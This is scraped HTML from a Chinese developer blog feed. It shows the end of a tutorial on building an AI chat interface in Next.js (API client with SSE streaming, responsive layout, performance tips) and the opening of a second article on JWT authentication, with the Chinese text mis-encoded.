<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_URL</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">NEXT_PUBLIC_API_URL</span> || <span class="hljs-string">'http://localhost:8000'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Conversation</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">title</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">created_at</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">updated_at</span>: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Message</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span> | <span class="hljs-string">'assistant'</span>
  <span class="hljs-attr">content</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">created_at</span>: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getConversations</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Conversation</span>[]&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/conversations`</span>, {
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${getAccessToken()}</span>`</span>
    }
  })
  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createConversation</span>(<span class="hljs-params">title: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Conversation</span>&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(
    <span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/conversations`</span>,
    { title },
    {
      <span class="hljs-attr">headers</span>: {
        <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${getAccessToken()}</span>`</span>
      }
    }
  )
  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getMessages</span>(<span class="hljs-params">conversationId: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Message</span>[]&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(
    <span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/conversations/<span class="hljs-subst">${conversationId}</span>/messages`</span>,
    {
      <span class="hljs-attr">headers</span>: {
        <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${getAccessToken()}</span>`</span>
      }
    }
  )
  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">StreamCallbacks</span> {
  onThinking?: <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
  onSources?: <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
  onToken?: <span class="hljs-function">(<span class="hljs-params">token: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
  onDone?: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>
  onError?: <span class="hljs-function">(<span class="hljs-params">error: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sendMessageStream</span>(<span class="hljs-params">
  conversationId: <span class="hljs-built_in">string</span>,
  message: <span class="hljs-built_in">string</span>,
  callbacks: StreamCallbacks
</span>) {
  <span class="hljs-keyword">const</span> ctrl = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AbortController</span>()
  
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchEventSource</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/chat/stream`</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
      <span class="hljs-string">'Authorization'</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${getAccessToken()}</span>`</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
      <span class="hljs-attr">conversation_id</span>: conversationId,
      <span class="hljs-attr">message</span>: message
    }),
    <span class="hljs-attr">signal</span>: ctrl.<span class="hljs-property">signal</span>,
    
    <span class="hljs-title function_">onmessage</span>(<span class="hljs-params">event</span>) {
      <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(event.<span class="hljs-property">data</span>)
      
      <span class="hljs-keyword">switch</span> (event.<span class="hljs-property">event</span>) {
        <span class="hljs-keyword">case</span> <span class="hljs-string">'thinking'</span>:
          callbacks.<span class="hljs-property">onThinking</span>?.(data)
          <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'sources'</span>:
          callbacks.<span class="hljs-property">onSources</span>?.(data)
          <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'token'</span>:
          callbacks.<span class="hljs-property">onToken</span>?.(data.<span class="hljs-property">token</span>)
          <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'done'</span>:
          callbacks.<span class="hljs-property">onDone</span>?.()
          <span class="hljs-keyword">break</span>
        <span class="hljs-keyword">case</span> <span class="hljs-string">'error'</span>:
          callbacks.<span class="hljs-property">onError</span>?.(data.<span class="hljs-property">error</span>)
          ctrl.<span class="hljs-title function_">abort</span>()
          <span class="hljs-keyword">break</span>
      }
    },
    
    <span class="hljs-title function_">onerror</span>(<span class="hljs-params">err</span>) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'SSE Error:'</span>, err)
      callbacks.<span class="hljs-property">onError</span>?.(err.<span class="hljs-property">message</span>)
      <span class="hljs-keyword">throw</span> err
    }
  })
}
</code></pre>
<hr/>
<h3 data-id="heading-17">äº”ã€å“åº”å¼è®¾è®¡</h3>
<h4 data-id="heading-18">5.1 ç§»åŠ¨ç«¯é€‚é…</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// app/chat/page.tsx</span>
<span class="hljs-string">'use client'</span>

<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [sidebarOpen, setSidebarOpen] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>)
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex h-screen bg-gray-50"</span>&gt;</span>
      {/* ä¾§è¾¹æ  - ç§»åŠ¨ç«¯å¯æŠ˜å  */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
        <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`${
          <span class="hljs-attr">sidebarOpen</span> ? '<span class="hljs-attr">w-64</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">w-0</span>'
        } <span class="hljs-attr">lg:w-64</span> <span class="hljs-attr">transition-all</span> <span class="hljs-attr">duration-300</span> <span class="hljs-attr">bg-white</span> <span class="hljs-attr">border-r</span> <span class="hljs-attr">border-gray-200</span> <span class="hljs-attr">flex</span> <span class="hljs-attr">flex-col</span> <span class="hljs-attr">overflow-hidden</span>`}
      &gt;</span>
        {/* ä¾§è¾¹æ å†…å®¹ */}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

      {/* ä¸»åŒºåŸŸ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex-1 flex flex-col"</span>&gt;</span>
        {/* å¤´éƒ¨ - ç§»åŠ¨ç«¯æ˜¾ç¤ºèœå•æŒ‰é’® */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"h-14 bg-white border-b border-gray-200 flex items-center px-4"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
            <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setSidebarOpen(!sidebarOpen)}
            className="lg:hidden p-2 hover:bg-gray-100 rounded mr-2"
          &gt;
            â˜°
          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg font-semibold text-gray-800"</span>&gt;</span>
            {currentConversation?.title || 'é€‰æ‹©æˆ–åˆ›å»ºå¯¹è¯'}
          <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        {/* å…¶ä»–å†…å®¹ */}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-19">5.2 Tailwindå“åº”å¼ç±»</h4>
<pre><code class="hljs language-tsx" lang="tsx">&lt;div className=<span class="hljs-string">"
  w-full          /* ç§»åŠ¨ç«¯ï¼šå…¨å®½ */
  md:w-1/2        /* å¹³æ¿ï¼šåŠå®½ */
  lg:w-1/3        /* æ¡Œé¢ï¼š1/3å®½ */
  p-4             /* ç§»åŠ¨ç«¯ï¼špadding 16px */
  md:p-6          /* å¹³æ¿ï¼špadding 24px */
  lg:p-8          /* æ¡Œé¢ï¼špadding 32px */
"</span>&gt;
  å“åº”å¼å†…å®¹
&lt;/div&gt;
</code></pre>
<hr/>
<h3 data-id="heading-20">å…­ã€æ€§èƒ½ä¼˜åŒ–</h3>
<h4 data-id="heading-21">6.1 ä»£ç åˆ†å‰²</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åŠ¨æ€å¯¼å…¥ç»„ä»¶</span>
<span class="hljs-keyword">import</span> dynamic <span class="hljs-keyword">from</span> <span class="hljs-string">'next/dynamic'</span>

<span class="hljs-keyword">const</span> <span class="hljs-title class_">ChatMessage</span> = <span class="hljs-title function_">dynamic</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">'@/components/ChatMessage'</span>), {
  <span class="hljs-attr">loading</span>: <span class="hljs-function">() =&gt;</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
})
</code></pre>
<h4 data-id="heading-22">6.2 å›¾ç‰‡ä¼˜åŒ–</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Image</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'next/image'</span>

&lt;<span class="hljs-title class_">Image</span>
  src=<span class="hljs-string">"/avatar.png"</span>
  alt=<span class="hljs-string">"ç”¨æˆ·å¤´åƒ"</span>
  width={<span class="hljs-number">32</span>}
  height={<span class="hljs-number">32</span>}
  className=<span class="hljs-string">"rounded-full"</span>
/&gt;
</code></pre>
<h4 data-id="heading-23">6.3 è™šæ‹Ÿæ»šåŠ¨</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { useVirtualizer } <span class="hljs-keyword">from</span> <span class="hljs-string">'@tanstack/react-virtual'</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">MessageList</span>(<span class="hljs-params">{ messages }</span>) {
  <span class="hljs-keyword">const</span> parentRef = useRef&lt;<span class="hljs-title class_">HTMLDivElement</span>&gt;(<span class="hljs-literal">null</span>)
  
  <span class="hljs-keyword">const</span> virtualizer = <span class="hljs-title function_">useVirtualizer</span>({
    <span class="hljs-attr">count</span>: messages.<span class="hljs-property">length</span>,
    <span class="hljs-attr">getScrollElement</span>: <span class="hljs-function">() =&gt;</span> parentRef.<span class="hljs-property">current</span>,
    <span class="hljs-attr">estimateSize</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-number">100</span>,
  })
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{parentRef}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"h-full overflow-auto"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">height:</span> `${<span class="hljs-attr">virtualizer.getTotalSize</span>()}<span class="hljs-attr">px</span>` }}&gt;</span>
        {virtualizer.getVirtualItems().map((virtualItem) =&gt; (
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
            <span class="hljs-attr">key</span>=<span class="hljs-string">{virtualItem.key}</span>
            <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span>
              <span class="hljs-attr">position:</span> '<span class="hljs-attr">absolute</span>',
              <span class="hljs-attr">top:</span> <span class="hljs-attr">0</span>,
              <span class="hljs-attr">left:</span> <span class="hljs-attr">0</span>,
              <span class="hljs-attr">width:</span> '<span class="hljs-attr">100</span>%',
              <span class="hljs-attr">transform:</span> `<span class="hljs-attr">translateY</span>(${<span class="hljs-attr">virtualItem.start</span>}<span class="hljs-attr">px</span>)`,
            }}
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ChatMessage</span> <span class="hljs-attr">message</span>=<span class="hljs-string">{messages[virtualItem.index]}</span> /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        ))}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<hr/>
<h3 data-id="heading-24">ä¸ƒã€æ€»ç»“</h3>
<p>Next.js 13æ„å»ºAIèŠå¤©ç•Œé¢çš„æ ¸å¿ƒè¦ç‚¹ï¼š</p>
<p>âœ… <strong>App Router</strong> - ä½¿ç”¨æ–°çš„è·¯ç”±ç³»ç»Ÿ<br/>
âœ… <strong>Client Components</strong> - äº¤äº’ç»„ä»¶ä½¿ç”¨<code>'use client'</code><br/>
âœ… <strong>SSEæµå¼ä¼ è¾“</strong> - å®æ—¶æ˜¾ç¤ºAIå›å¤<br/>
âœ… <strong>å“åº”å¼è®¾è®¡</strong> - é€‚é…ç§»åŠ¨ç«¯å’Œæ¡Œé¢ç«¯<br/>
âœ… <strong>æ€§èƒ½ä¼˜åŒ–</strong> - ä»£ç åˆ†å‰²ã€è™šæ‹Ÿæ»šåŠ¨</p>
<p><strong>ä¸‹ä¸€ç¯‡é¢„å‘Šï¼š</strong> ã€ŠTailwindCSSæ‰“é€ ä¼˜é›…çš„å¯¹è¯UIç»„ä»¶ã€‹</p>
<hr/>
<p><strong>ä½œè€…ç®€ä»‹ï¼š</strong> èµ„æ·±å¼€å‘è€…ï¼Œåˆ›ä¸šè€…ã€‚ä¸“æ³¨äºè§†é¢‘é€šè®¯æŠ€æœ¯é¢†åŸŸã€‚å›½å†…é¦–æœ¬Flutterè‘—ä½œã€ŠFlutteræŠ€æœ¯å…¥é—¨ä¸å®æˆ˜ã€‹ä½œè€…,å¦è‘—æœ‰ã€ŠDartè¯­è¨€å®æˆ˜ã€‹åŠã€ŠWebRTCéŸ³è§†é¢‘å¼€å‘ã€‹ç­‰ä¹¦ç±ã€‚å¤šå¹´ä»äº‹è§†é¢‘ä¼šè®®ã€è¿œç¨‹æ•™è‚²ç­‰æŠ€æœ¯ç ”å‘ï¼Œå¯¹äºAndroidã€iOSä»¥åŠè·¨å¹³å°å¼€å‘æŠ€æœ¯æœ‰æ¯”è¾ƒæ·±å…¥çš„ç ”ç©¶å’Œåº”ç”¨ï¼Œä½œä¸ºä¸»è¦ç¨‹åºå‘˜å¼€å‘äº†å¤šä¸ªåº”ç”¨é¡¹ç›®ï¼Œæ¶‰åŠåŒ»ç–—ã€äº¤é€šã€é“¶è¡Œç­‰é¢†åŸŸã€‚</p>
<p><strong>å­¦ä¹ èµ„æ–™ï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkangshaojun%2Fai-agent-framework" target="_blank" title="https://github.com/kangshaojun/ai-agent-framework" ref="nofollow noopener noreferrer">é¡¹ç›®åœ°å€</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fkangshaojun" target="_blank" title="https://github.com/kangshaojun" ref="nofollow noopener noreferrer">ä½œè€…GitHub</a></li>
</ul>
<p><strong>æ¬¢è¿äº¤æµï¼š</strong> å¦‚æœ‰é—®é¢˜æ¬¢è¿åœ¨è¯„è®ºåŒºè®¨è®º ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[09-JWTè®¤è¯åœ¨Next.jsä¸­çš„æœ€ä½³å®è·µ]]></title>    <link>https://juejin.cn/post/7589893746081218601</link>    <guid>https://juejin.cn/post/7589893746081218601</guid>    <pubDate>2026-01-02T01:47:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746081218601" data-draft-id="7589839433321726015" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="09-JWTè®¤è¯åœ¨Next.jsä¸­çš„æœ€ä½³å®è·µ"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-02T01:47:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="kevin_kang"/> <meta itemprop="url" content="https://juejin.cn/user/3034307824720670"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            09-JWTè®¤è¯åœ¨Next.jsä¸­çš„æœ€ä½³å®è·µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3034307824720670/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    kevin_kang
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:47:35.000Z" title="Fri Jan 02 2026 01:47:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JWTè®¤è¯åœ¨Next.jsä¸­çš„æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-1">å‰è¨€</h3>
<p>JWTï¼ˆJSON Web Tokenï¼‰æ˜¯ç°ä»£Webåº”ç”¨ä¸­æœ€æµè¡Œçš„è®¤è¯æ–¹æ¡ˆã€‚æœ¬æ–‡å°†ä»‹ç»å¦‚ä½•åœ¨Next.jsä¸­å®ç°å®‰å…¨ã€é«˜æ•ˆçš„JWTè®¤è¯ç³»ç»Ÿã€‚</p>
<p><strong>é€‚åˆè¯»è€…ï¼š</strong> å‰ç«¯å¼€å‘è€…ã€å…¨æ ˆå·¥ç¨‹å¸ˆã€å®‰å…¨å·¥ç¨‹å¸ˆ</p>
<hr/>
<h3 data-id="heading-2">ä¸€ã€JWTåŸºç¡€</h3>
<h4 data-id="heading-3">1.1 JWTç»“æ„</h4>
<pre><code class="hljs language-css" lang="css">JWT = <span class="hljs-selector-tag">Header</span><span class="hljs-selector-class">.Payload</span><span class="hljs-selector-class">.Signature</span>

<span class="hljs-selector-tag">Header</span> (å¤´éƒ¨):
{
  "alg": <span class="hljs-string">"HS256"</span>,
  <span class="hljs-string">"typ"</span>: <span class="hljs-string">"JWT"</span>
}

Payload (è´Ÿè½½):
{
  "user_id": <span class="hljs-number">123</span>,
  <span class="hljs-string">"username"</span>: <span class="hljs-string">"alice"</span>,
  <span class="hljs-string">"exp"</span>: <span class="hljs-number">1735689600</span>,
  <span class="hljs-string">"type"</span>: <span class="hljs-string">"access"</span>
}

Signature (ç­¾å):
<span class="hljs-built_in">HMACSHA256</span>(
  <span class="hljs-built_in">base64UrlEncode</span>(header) + <span class="hljs-string">"."</span> +
  <span class="hljs-built_in">base64UrlEncode</span>(payload),
  secret
)
</code></pre>
<h4 data-id="heading-4">1.2 åŒTokenæœºåˆ¶</h4>
<pre><code class="hljs language-diff" lang="diff">Access Token:
<span class="hljs-deletion">- çŸ­æœŸæœ‰æ•ˆï¼ˆ30åˆ†é’Ÿï¼‰</span>
<span class="hljs-deletion">- ç”¨äºAPIè¯·æ±‚</span>
<span class="hljs-deletion">- å­˜å‚¨åœ¨å†…å­˜æˆ–localStorage</span>

Refresh Token:
<span class="hljs-deletion">- é•¿æœŸæœ‰æ•ˆï¼ˆ7å¤©ï¼‰</span>
<span class="hljs-deletion">- ç”¨äºåˆ·æ–°Access Token</span>
<span class="hljs-deletion">- å­˜å‚¨åœ¨httpOnly Cookieï¼ˆæ›´å®‰å…¨ï¼‰</span>
</code></pre>
<hr/>
<h3 data-id="heading-5">äºŒã€è®¤è¯æµç¨‹è®¾è®¡</h3>
<h4 data-id="heading-6">2.1 å®Œæ•´è®¤è¯æµç¨‹</h4>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> ç”¨æˆ·ç™»å½•
   â†“
<span class="hljs-bullet">2.</span> æœåŠ¡å™¨éªŒè¯ç”¨æˆ·åå¯†ç 
   â†“
<span class="hljs-bullet">3.</span> ç”ŸæˆAccess Token + Refresh Token
   â†“
<span class="hljs-bullet">4.</span> è¿”å›Tokenç»™å®¢æˆ·ç«¯
   â†“
<span class="hljs-bullet">5.</span> å®¢æˆ·ç«¯å­˜å‚¨Token
   â†“
<span class="hljs-bullet">6.</span> åç»­è¯·æ±‚æºå¸¦Access Token
   â†“
<span class="hljs-bullet">7.</span> Access Tokenè¿‡æœŸ
   â†“
<span class="hljs-bullet">8.</span> ä½¿ç”¨Refresh Tokenåˆ·æ–°
   â†“
<span class="hljs-bullet">9.</span> è·å–æ–°çš„Access Token
   â†“
<span class="hljs-bullet">10.</span> ç»§ç»­ä½¿ç”¨
</code></pre>
<h4 data-id="heading-7">2.2 Tokenåˆ·æ–°æµç¨‹</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">è¯·æ±‚API</span>
   <span class="hljs-string">â†“</span>
<span class="hljs-string">Access</span> <span class="hljs-string">Tokenæœ‰æ•ˆ?</span> <span class="hljs-string">â”€Yesâ†’</span> <span class="hljs-string">è¿”å›æ•°æ®</span>
   <span class="hljs-string">â†“</span> <span class="hljs-literal">No</span>
